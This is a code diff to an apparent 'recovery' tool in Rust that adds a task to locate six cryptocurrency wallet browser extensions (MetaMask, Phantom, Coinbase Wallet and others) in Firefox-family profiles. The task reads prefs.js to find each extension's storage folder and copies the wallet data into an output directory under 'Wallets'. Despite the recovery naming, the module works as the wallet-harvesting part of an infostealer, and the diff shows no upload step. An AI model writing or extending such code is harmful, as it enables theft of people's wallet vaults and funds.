@@ -1,12 +1,13 @@
 use crate::recovery::{
     context::RecoveryContext,
+    fs::copy_dir_limited,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
 use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
-use tracing::debug;
+use tracing::{debug, warn};
 use winreg::{
     RegKey,
     enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
@@ -75,6 +76,15 @@ const GECKO_INSTALL_REGISTRY: &[(&str, &[&str])] = &[
     ("Flock", &[r"SOFTWARE\Flock", r"SOFTWARE\WOW6432Node\Flock"]),
 ];
 
+const TARGET_EXTENSIONS: &[(&str, &str)] = &[
+    ("MetaMask", "webextension@metamask.io"),
+    ("Phantom", "phantom-app@ghost"),
+    ("Ronin Wallet", "ronin-wallet@axielabs.com"),
+    ("Exodus Web3", "exodus-web3-wallet@exodus.com"),
+    ("Coinbase Wallet", "coinbase-wallet-extension@coinbase.com"),
+    ("Trust Wallet", "trust-wallet-extension@trustwallet.com"),
+];
+
 pub fn gecko_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
     let profiles = match discover_gecko_profiles(ctx) {
@@ -93,6 +103,9 @@ pub fn gecko_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
             });
             tasks.push(task);
         }
+        tasks.push(Arc::new(GeckoExtensionTask {
+            profile: profile.clone(),
+        }));
     }
 
     tasks
@@ -236,6 +249,89 @@ impl RecoveryTask for GeckoRecoveryTask {
 
         Ok(artifacts)
     }
+}
+
+struct GeckoExtensionTask {
+    profile: GeckoProfile,
+}
+
+#[async_trait]
+impl RecoveryTask for GeckoExtensionTask {
+    fn label(&self) -> String {
+        format!(
+            "{browser}/{profile} - Extensions",
+            browser = self.profile.browser,
+            profile = self.profile.profile_name
+        )
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Wallets
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let storage_dir = self.profile.path.join("storage").join("default");
+        
+        if !storage_dir.exists() {
+            return Ok(artifacts);
+        }
+
+        let uuid_map = resolve_extension_uuids(&self.profile.path);
+
+        for (name, id) in TARGET_EXTENSIONS {
+            if let Some(uuid) = uuid_map.get(*id) {
+                // Folder format: moz-extension+++<UUID>
+                let folder_name = format!("moz-extension+++{}", uuid);
+                let extension_dir = storage_dir.join(folder_name);
+
+                if extension_dir.exists() {
+                    let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
+                        "{}_{}_{}",
+                        self.profile.browser,
+                        self.profile.profile_name,
+                        name
+                    ));
+                    let _ = std::fs::create_dir_all(&dest_root);
+
+                    // Usually the 'idb' folder contains the IndexedDB data
+                    match copy_dir_limited(&extension_dir, &dest_root, name, &mut artifacts, usize::MAX, 0).await {
+                        Ok(_) => debug!(extension=?name, "recovered gecko extension data"),
+                        Err(err) => warn!(extension=?name, error=?err, "failed to recover gecko extension"),
+                    }
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+fn resolve_extension_uuids(profile_path: &Path) -> HashMap<String, String> {
+    let mut map = HashMap::new();
+    let prefs_path = profile_path.join("prefs.js");
+    
+    if let Ok(content) = std::fs::read_to_string(prefs_path) {
+        for line in content.lines() {
+            let line = line.trim();
+            // Look for: user_pref("extensions.webextensions.uuids", "{\"<ID>\":\"<UUID>\",...}");
+            if line.starts_with("user_pref(\"extensions.webextensions.uuids\",") {
+                if let Some(start) = line.find("\"{") {
+                    if let Some(end) = line.rfind("}\"") {
+                        let json_str = &line[start + 1..end + 1]; // Grab the JSON string inside the quotes
+                        // Unescape the JSON string if necessary (simple unescape for quotes)
+                        let json_clean = json_str.replace("\\\"", "\"");
+                        
+                        if let Ok(parsed) = serde_json::from_str::<HashMap<String, String>>(&json_clean) {
+                            map.extend(parsed);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    map
 }
 
 pub fn discover_gecko_profiles(ctx: &RecoveryContext) -> Result<Vec<GeckoProfile>, RecoveryError> {
